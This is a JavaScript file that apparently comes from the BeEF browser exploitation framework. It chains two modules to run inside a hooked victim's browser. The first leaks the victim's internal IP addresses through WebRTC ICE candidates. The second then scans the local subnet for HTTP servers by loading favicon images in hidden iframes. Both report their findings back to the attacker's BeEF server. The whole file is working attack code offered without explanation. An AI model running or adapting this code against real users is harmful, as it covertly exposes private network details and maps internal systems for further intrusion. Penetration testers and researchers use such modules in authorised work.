var get_internal_ip_webrtc_5d82b59a5c = function(){
    beef.execute(function() {

        var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

        if (RTCPeerConnection){
      
            var addrs = Object.create(null);
            addrs["0.0.0.0"] = false;
      
            // Construct RTC peer connection
            var servers = {iceServers:[]};
            var mediaConstraints = {optional:[{googIPv6: true}]};
            var rtc = new RTCPeerConnection(servers, mediaConstraints);
            rtc.createDataChannel('', {reliable:false});
      
            // Upon an ICE candidate being found
            // Grep the SDP data for IP address data
            rtc.onicecandidate = function (evt) {
              if (evt.candidate){
                beef.debug("a="+evt.candidate.candidate);
                grepSDP("a="+evt.candidate.candidate);
            retResults();
              }
            };
      
            // Create an SDP offer
            rtc.createOffer(function (offerDesc) {
                grepSDP(offerDesc.sdp);
                rtc.setLocalDescription(offerDesc);
            retResults();
            }, function (e) {
                beef.debug("SDP Offer Failed");
                beef.net.send('/command/get_internal_ip_webrtc.js', 1, "SDP Offer Failed", beef.are.status_error());
              });
      
          function retResults(){
            var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
      
            // This is for the ARE, as this module is async, so we can't just return as we would in a normal sync way
            get_internal_ip_webrtc_5d82b59a5c_mod_output = [beef.are.status_success(), displayAddrs.join(",")];
          }
      
            // Return results
            function processIPs(newAddr) {
                if (newAddr in addrs) return;
                else addrs[newAddr] = true;
                var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
                beef.debug("Found IPs: "+ displayAddrs.join(","));
                beef.net.send('/command/get_internal_ip_webrtc.js', 1, "IP is " + displayAddrs.join(","), beef.are.status_success());
            }
      
      
            // Retrieve IP addresses from SDP 
            function grepSDP(sdp) {
                var hosts = [];
                sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
                    if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                        var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                            addr = parts[4],
                            type = parts[7];
                        if (type === 'host') processIPs(addr);
                    } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                        var parts = line.split(' '),
                            addr = parts[2];
                        processIPs(addr);
                    }
                });
            }
        }else {
          beef.net.send('/command/get_internal_ip_webrtc.js', 1, "Browser doesn't appear to support RTCPeerConnection", beef.are.status_error());
        }
      });
};

var get_internal_ip_webrtc_5d82b59a5c_can_exec = false;
var get_internal_ip_webrtc_5d82b59a5c_mod_output = null;

var get_http_servers_5d82b59a5c = function(mod_input){
  beef.execute(function() {

    var ips     = mod_input;
    var ports   = "80,8080";
    var timeout = parseInt("10", 10)*1000;
    var wait    = parseInt("5", 10)*1000;
    var threads = parseInt("3", 10);
    // var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');
    var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png', '/icons/apache_pb2.gif');
  
    if(beef.browser.isO()) {
      beef.debug("[Favicon Scanner] Browser is not supported.");
      beef.net.send("/command/get_http_servers.js", 2, "fail=unsupported browser", beef.are.status_error());
      return;
    }
  
    var sort_unique = function (arr) {
      arr = arr.sort(function (a, b) { return a*1 - b*1; });
      var ret = [arr[0]];
      for (var i = 1; i < arr.length; i++) {
          if (arr[i-1] !== arr[i]) {
              ret.push(arr[i]);
          }
      }
      return ret;
    }
  
    // set target ports
    var is_valid_port = function(port) {
      if (isNaN(port)) return false;
      if (port > 65535 || port < 0) return false;
      return true;
    }
    ports = ports.split(',');
    var target_ports = new Array();
    for (var i=0; i<ports.length; i++) {
      var p = ports[i].replace(/(^\s+|\s+$)/g, '');
      if (is_valid_port(p)) target_ports.push(p);
    }
    ports = sort_unique(target_ports);
    if (ports.length == 0) {
      beef.net.send("/command/get_http_servers.js", 2, "fail=no ports specified", beef.are.status_error());
      return;
    }
  
    // set target IP addresses
    var is_valid_ip = function(ip) {
      if (ip == null) return false;
      var ip_match = ip.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
      if (ip_match == null) return false;
      return true;
    }
    var is_valid_ip_range = function(ip_range) {
      if (ip_range == null) return false;
      var range_match = ip_range.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
      if (range_match == null || range_match[1] == null) return false;
      return true;
    }
    if (ips == 'common') {
      ips = [
        '192.168.0.1',
        '192.168.0.100',
        '192.168.0.254',
        '192.168.1.1',
        '192.168.1.100',
        '192.168.1.254',
        '10.0.0.1',
        '10.1.1.1',
        '192.168.2.1',
        '192.168.2.254',
        '192.168.100.1',
        '192.168.100.254',
        '192.168.123.1',
        '192.168.123.254',
        '192.168.10.1',
        '192.168.10.254' ];
    } else {
      ips = ips.split(',');
      var target_ips = new Array();
      for (var i=0; i<ips.length; i++) {
        var ip = ips[i].replace(/(^\s+|\s+$)/g, '');
        if (is_valid_ip(ip)) target_ips.push(ip);
        else if (is_valid_ip_range(ip)) {
          ipBounds   = ip.split('-');
          lowerBound = ipBounds[0].split('.')[3];
          upperBound = ipBounds[1].split('.')[3];
          for (var i = lowerBound; i <= upperBound; i++) {
            target_ips.push(ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i);
          }
        }
      }
      ips = sort_unique(target_ips);
      if (ips.length == 0) {
          beef.net.send("/command/get_http_servers.js", 2, "fail=malformed target IP address(es) supplied", beef.are.status_error());
          return;
      }
    }
  
    // request the specified paths from the specified URL
    // and report all live URLs back to BeEF
    checkFavicon = function(proto, ip, port, uri) {
      var img = new Image;
      var dom = beef.dom.createInvisibleIframe();
      beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
      img.src = proto+"://"+ip+":"+port+uri;
      img.onerror = function() { dom.removeChild(this); }
      img.onload = function() {
        beef.net.send('/command/get_http_servers.js', 2,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
        beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
      }
      dom.appendChild(img);
      // stop & remove iframe
      setTimeout(function() {
        if (dom.contentWindow.stop !== undefined) {
          dom.contentWindow.stop();
        } else if (dom.contentWindow.document.execCommand !== undefined) {
          dom.contentWindow.document.execCommand("Stop", false);
        }
        document.body.removeChild(dom);
      }, timeout);
    }
  
    // configure workers
    WorkerQueue = function(id, frequency) {
      var stack = [];
      var timer = null;
      var frequency = frequency;
      var start_scan = (new Date).getTime();
      this.process = function() {
        var item = stack.shift();
        eval(item);
        if (stack.length === 0) {
          clearInterval(timer);
          timer = null;
          var interval = (new Date).getTime() - start_scan;
          beef.debug("[Favicon Scanner] Worker #"+id+" has finished ["+interval+" ms]");
          return;
        }
      }
      this.queue = function(item) {
        stack.push(item);
        if (timer === null) timer = setInterval(this.process, frequency);
      }
    }
  
    // create workers
    var workers = new Array();
    for (var id = 0; id < threads; id++) workers.push(new WorkerQueue(id, wait));
  
    // for each favicon path:
    for (var u=0; u < urls.length; u++) {
      var worker = workers[u % threads];
      // for each LAN IP address:
      for (var i=0; i < ips.length; i++) {
        // for each port:
        for (var p=0; p < ports.length; p++) {
          var host = ips[i];
          var port = ports[p];
          if (port == '443') var proto = 'https'; else var proto = 'http';
          // add URL to worker queue
          worker.queue('checkFavicon("'+proto+'","'+host+'","'+port+'","'+urls[u]+'");');
        }
      }
    }
  
  });
};

var get_http_servers_5d82b59a5c_can_exec = false;
var get_http_servers_5d82b59a5c_mod_output = null;
            

function get_internal_ip_webrtc_5d82b59a5c_f(){
    get_internal_ip_webrtc_5d82b59a5c();

    // TODO add timeout to prevent infinite loops
    function isResReady(mod_result, start){
        if (mod_result === null && parseInt(((new Date().getTime()) - start)) < 5000){
            // loop
        }else{
            // module return status/data is now available
            clearInterval(resultReady);
            if (mod_result === null && true){
                var mod_result = [];
                mod_result[0] = 1; //unknown status
                mod_result[1] = '' //empty result
            }

            var status = mod_result[0];

            if(status==1){
                get_http_servers_5d82b59a5c_can_exec = true;
                get_internal_ip_webrtc_5d82b59a5c_mod_output = mod_result[1];
                // END OF THE FIRST ITERATION OF ADDING CONTENT TO
                // delayed_exec

                // START OF LAST ITERATION (else) OF ADDING CONTENT TO
                // delayed_exec
                function get_http_servers_5d82b59a5c_f(){
                    if(get_http_servers_5d82b59a5c_can_exec){
                        var s=get_internal_ip_webrtc_5d82b59a5c_mod_output.split('.');
                        var start = s[0]+'.'+s[1]+'.1.89';
                        var end = s[0]+'.'+s[1]+'.1.91';
                        var mod_input = start+'-'+end;
                        get_http_servers_5d82b59a5c(mod_input);
                    }
                }

                get_http_servers_5d82b59a5c_f();
                // END OF LAST ITERATION (else) OF ADDING CONTENT TO
                // delayed_exec

            // START OF FIRST ITERATION OF ADDING delayed_exec_footer
            }
        }
    }

    var start = (new Date()).getTime();
    var resultReady = setInterval(function(){
        var start = (new Date()).getTime();
        isResReady(get_internal_ip_webrtc_5d82b59a5c_mod_output, start);
    },300);
}

get_internal_ip_webrtc_5d82b59a5c_f();
              
